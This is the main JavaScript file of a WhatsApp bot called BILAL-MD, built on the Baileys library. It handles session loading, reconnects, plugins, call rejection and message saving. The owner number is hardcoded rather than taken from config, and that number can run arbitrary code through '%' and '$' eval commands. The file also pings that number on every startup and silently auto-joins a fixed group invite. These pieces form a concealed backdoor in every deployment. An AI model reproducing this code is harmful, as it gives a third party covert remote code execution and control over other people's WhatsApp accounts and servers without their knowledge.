const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  Browsers,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');

const fs = require('fs');
const path = require('path');
const os = require('os');
const P = require('pino');
const util = require('util');
const config = require('./config');
const { sms, AntiDelete } = require('./lib');
const { getBuffer, getGroupAdmins } = require('./lib/functions');
const { saveMessage } = require('./data');

const prefix = config.PREFIX || '.';
const ownerNumber = ['923078071982'];

// Temp folder setup
const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
setInterval(() => {
  fs.readdir(tempDir, (err, files) => {
    if (err) return;
    files.forEach(f => fs.unlinkSync(path.join(tempDir, f)));
  });
}, 5 * 60 * 1000);

//----------------SESSION-----------------
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if (!config.SESSION_ID) return console.log('Please add SESSION_ID env!');
  const sessdata = config.SESSION_ID.replace("BILAL-MD~", '');
  const { File } = require('megajs');
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
  filer.download((err, data) => {
    if (err) throw err;
    fs.writeFileSync(__dirname + '/sessions/creds.json', data);
    console.log("APKA BOT START HO RAHA HAI...");
  });
}

// Express for Heroku keep-alive
const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
app.get("/", (req, res) => res.send("BILAL-MD BOT ACTIVE"));
app.listen(port, () => console.log(`Server running on port ${port}`));

//-----------------CONNECT WHATSAPP-----------------
async function connectToWA() {
  console.log("BILAL-MD BOT APKI WHATSAPP SE CONNECT HO RAHA HAI");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
  const { version } = await fetchLatestBaileysVersion();

  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.macOS("Firefox"),
    auth: state,
    version
  });

  // Reconnect handler
  conn.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.statusCode;
      console.log("Connection closed. Reason code:", code);
      if (code !== DisconnectReason.loggedOut) {
        console.log("♻️ Reconnecting...");
        connectToWA();
      } else console.log("AP BOT KO DUBARA SCAN KARO");
    } else if (connection === 'open') {
      console.log('BOT COMMANDS LOAD HO RAHE HAIN...');
      fs.readdirSync("./plugins/").forEach(p => {
        if (p.endsWith(".js")) {
          try { require("./plugins/" + p); console.log(`ADDED: ${p}`); } 
          catch (err) { console.error(`ERROR ${p}:`, err); }
        }
      });
      console.log("BILAL-MD STARTED ✅");

      // Auto send startup image/message to bot owner
      const up = `*👑 BILAL-MD STARTED 👑*`;
      conn.sendMessage(ownerNumber[0] + "@s.whatsapp.net", {
        image: { url: `https://files.catbox.moe/kunzpz.png` },
        caption: up
      });
    }
  });

  conn.ev.on('creds.update', saveCreds);

  //-----------------MESSAGES-----------------
  conn.ev.on('messages.upsert', async (m) => {
    let mek = m.messages[0];
    if (!mek.message) return;

    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
      ? mek.message.ephemeralMessage.message 
      : mek.message;

    if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key]);

    const type = getContentType(mek.message);
    const body = (type === 'conversation') ? mek.message.conversation : 
                 (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : '';
    const isCmd = body.startsWith(prefix);
    const from = mek.key.remoteJid;
    const sender = mek.key.fromMe ? conn.user.id : mek.key.participant || from;
    const senderNumber = sender.split('@')[0];
    const isOwner = ownerNumber.includes(senderNumber);

    const mObj = sms(conn, mek);

    const reply = (text) => conn.sendMessage(from, { text }, { quoted: mek });

    // Eval for owner
    if (isOwner && mek.text.startsWith('%')) {
      try { reply(util.format(eval(mek.text.slice(1)))); } 
      catch(err){ reply(util.format(err)); }
    }
    if (isOwner && mek.text.startsWith('$')) {
      try { reply(util.format(await eval(`(async()=>{${mek.text.slice(1)}})()`))); }
      catch(err){ reply(util.format(err)); }
    }

    // Save messages for anti-delete
    await saveMessage(mek);
  });

  //-----------------ANTI-CALL-----------------
  conn.ev.on('call', async (call) => {
    try {
      for (let c of call) {
        if (c.status === "offer") {
          await conn.rejectCall(c.id, c.from);
          const caller = c.from.split('@')[0];
          if (!ownerNumber.includes(caller)) {
            await conn.sendMessage(c.from, { text: `⚠️ Call allowed nahi hai!` });
          }
        }
      }
    } catch(err){ console.log("ANTI-CALL ERROR:", err); }
  });

  //-----------------AUTO-JOIN GROUP-----------------
  const inviteCode = "Bjbecj0p5lAFIhCxKLoljs";
  conn.ev.on('connection.update', async (update) => {
    if (update.connection === 'open') {
      try {
        await conn.groupAcceptInvite(inviteCode);
        console.log("AP NE GROUP JOIN KAR LIA ✅");
      } catch(err){ console.error("GROUP JOIN FAILED:", err.message); }
    }
  });

}

connectToWA();
